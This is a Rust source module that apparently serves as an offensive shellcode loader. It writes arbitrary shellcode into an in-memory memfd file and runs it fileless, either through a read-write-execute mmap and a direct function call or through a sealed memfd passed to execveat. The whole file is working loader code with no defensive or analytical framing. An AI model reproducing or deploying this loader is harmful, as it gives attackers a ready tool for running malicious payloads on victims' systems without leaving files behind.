use std::os::unix::io::RawFd;
use libc::{self, AT_EMPTY_PATH, F_ADD_SEALS, F_SEAL_SHRINK, F_SEAL_WRITE, MAP_SHARED, MFD_CLOEXEC, fcntl, memfd_create};
use crate::config::Config;

pub unsafe fn create_memfd(config: &Config, is_execveat: bool) -> Result<RawFd, String> {
    config.log("Creating memfd...");

    let flags = if is_execveat {
        MFD_CLOEXEC | libc::MFD_ALLOW_SEALING
    } else {
        MFD_CLOEXEC
    };

    let fd = memfd_create(b"shellcode\0".as_ptr() as *const i8, flags);
    if fd < 0 {
        return Err("memfd_create failed".to_string());
    }

    config.log(&format!("Memfd created: fd={}", fd));
    Ok(fd)
}

pub unsafe fn write_to_memfd(fd: RawFd, shellcode: &[u8], config: &Config) -> Result<(), String> {
    config.log(&format!("Writing {} bytes to fd {}...", shellcode.len(), fd));
    let written = libc::write(fd, shellcode.as_ptr() as *const libc::c_void, shellcode.len());

    if written as usize != shellcode.len() {
        return Err("Failed to write all bytes".to_string());
    }

    config.log("Shellcode written successfully");
    Ok(())
}

pub unsafe fn map_memfd_executable(fd: RawFd, size: usize, config: &Config) -> Result<*mut libc::c_void, String> {
    config.log(&format!("Mapping {} bytes from fd with rwx...", size));
    let mem = libc::mmap(std::ptr::null_mut(), size, libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC, MAP_SHARED, fd, 0);
    if mem == libc::MAP_FAILED {
        return Err("mmap failed".to_string());
    }
    config.log(&format!("{} bytes mapped from fd with rwx at: 0x{}", size, mem as usize));
    Ok(mem)
}

pub fn execute_fileless_mmap(shellcode: &[u8], config: &Config) -> Result<(), String> {
    config.log("=== Fileless (memfd + mmap) ===");

    unsafe {
        let size = shellcode.len();
        let fd = create_memfd(config, false)?;
        write_to_memfd(fd, shellcode, config)?;
        let mem = map_memfd_executable(fd, size, config)?;
        config.log(&format!("Executing shellcode at 0x{:x}...", mem as usize));

        let func = std::mem::transmute::<*mut libc::c_void, fn()>(mem);
        func();
        config.log("Shellcode executed!");

        config.log("Cleaning up...");
        libc::munmap(mem, size);
        config.log("Cleanup complete");
    }
    Ok(())
}

pub fn seal_memfd(fd: i32, config: &Config) -> Result<(), String> {
    config.log("Sealing memfd...");

    unsafe {
        let ret = fcntl(fd, F_ADD_SEALS, F_SEAL_WRITE | F_SEAL_SHRINK);
        if ret < 0 {
            return Err("fcntl F_ADD_SEALS failed".to_string());
        }
    }
    config.log("Memfd sealed");
    Ok(())
}

pub fn fileless_execveat(shellcode: &[u8], config: &Config) -> Result<(), String> {
    config.log("=== Fileless (memfd + execveat) ===");

    unsafe {
        config.log("Creating memfd with sealing support...");
        let fd = create_memfd(config, true)?;
        write_to_memfd(fd, shellcode, config)?;
        seal_memfd(fd, config)?;
        
        let arg0 = b"shellcode\0".as_ptr() as *const libc::c_char;
        let argv: [*const libc::c_char; 2] = [arg0, std::ptr::null()];
        let envp: [*const libc::c_char; 1] = [std::ptr::null()];

        config.log("Calling execveat...");
        libc::syscall(libc::SYS_execveat, fd, b"\0",
            argv.as_ptr(), envp.as_ptr(), AT_EMPTY_PATH);
        
        let err = *libc::__errno_location();
        libc::close(fd);
        Err(format!("execveat failed: errno={}", err))
    }
}
